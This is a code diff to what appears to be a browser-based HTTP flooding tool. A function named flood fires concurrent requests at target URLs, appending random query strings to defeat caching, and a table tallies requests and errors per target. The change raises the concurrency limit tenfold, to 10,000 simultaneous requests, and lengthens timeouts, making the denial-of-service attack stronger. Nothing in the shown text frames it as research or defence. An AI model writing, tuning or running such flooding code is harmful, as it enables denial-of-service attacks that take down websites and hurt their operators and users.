@@ -28,9 +28,9 @@ var statsEl = document.getElementById('stats');
 function printStats() {
   statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
 }
-setInterval(printStats, 1000);
+setInterval(printStats, 10000);
 
-var CONCURRENCY_LIMIT = 1000
+var CONCURRENCY_LIMIT = 10000
 var queue = []
 
 async function fetchWithTimeout(resource, options) {
@@ -54,9 +54,9 @@ async function flood(target) {
     if (queue.length > CONCURRENCY_LIMIT) {
       await queue.shift()
     }
-    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 10000)
     queue.push(
-      fetchWithTimeout(target+rand, { timeout: 1000 })
+      fetchWithTimeout(target+rand, { timeout: 10000 })
         .catch((error) => {
           if (error.code === 20 /* ABORT */) {
             return;
